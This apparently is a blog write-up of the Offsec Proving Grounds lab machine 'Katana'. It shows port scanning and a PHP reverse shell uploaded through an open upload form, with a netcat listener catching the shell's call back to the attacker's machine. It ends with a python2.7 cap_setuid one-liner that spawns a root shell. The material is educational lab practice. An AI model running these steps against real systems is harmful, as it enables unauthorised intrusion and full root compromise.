---
title: "Proving grounds Play: Katana"
layout: post
date: 2023-09-28 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 894f3a5401f8dcb66ee078fc60a6de35 (RSA)
|   256 ddaccc4e43816be32df312a13e4ba322 (ECDSA)
|_  256 cce625c0c6119f88f6c4261edefae98b (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Katana X
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.38 (Debian)
8088/tcp open  http    LiteSpeed httpd
|_http-title: Katana X
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: LiteSpeed
8715/tcp open  http    nginx 1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-title: 401 Authorization Required
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## 21/tcp - open  ftp - vsftpd 3.0.3

Anonymous login prohibited.

## 80/tcp -  open  http - Apache httpd 2.4.38 ((Debian))

Nothing, but just an image.

![img](/assets/images/CTF/Proving_Grounds/Katana/web-8088.png)

## 8088/tcp - open  http - LiteSpeed httpd

### Directory Fuzzing

Directory fuzzing found multiple files.

```text
http://192.168.197.83:8088/phpinfo.php
http://192.168.197.83:8088/upload.php
http://192.168.197.83:8088/upload.html
```

### upload.html

File upload

![img](/assets/images/CTF/Proving_Grounds/Katana/upload.png)

```text
Please wait for 1 minute!. Please relax!.
File : file1
Name : rshell.php
Type : application/x-php
Path : /tmp/phpSvDMjM
Size : 2589
Please wait for 1 minute!. Please relax!. Moved to other web server: /tmp/phpSvDMjM ====> /opt/manager/html/katana_rshell.php
MD5  : 8bdfb93257f57669e9aa5b48caffe853
Size : 2589 bytes
File : file2
Name : rshell.php
Type : application/x-php
Path : /tmp/phpaXZwe8
Size : 2589
Please wait for 1 minute!. Please relax!. Moved to other web server: /tmp/phpaXZwe8 ====> /opt/manager/html/katana_rshell.php
```

Upload the reverse shell and note down the file name. Fuzz for the file on all 3 URLs.

**Trigger**
http://192.168.197.83:8715/katana_rshell.php

```sh
naveenj@hackerspace:|21:35|~/pg-play/Katana/files$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.237] from (UNKNOWN) [192.168.197.83] 58806
Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 21:37:41 up 18 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (407): Inappropriate ioctl for device
bash: no job control in this shell
www-data@katana:/$ 
```
**Initial Foothold Obtained**

## Privilege Escalation

Get the extended capabilities of the linux machine using the below command.

```sh
getcap -r / 2>/dev/null
```

**Capabilities**

```sh
www-data@katana:~$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
```

The binary `/usr/bin/python2.7` has extended capabilities which is vulnerable to privilege escalation.
[More](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example).

```sh
www-data@katana:~$ getcap -r / 2>/dev/null  #Get capabilities
getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
www-data@katana:~$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");' #Exploit
< 'import os; os.setuid(0); os.system("/bin/bash");'
id
uid=0(root) gid=33(www-data) groups=33(www-data) #Root Obtained
whoami
root
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).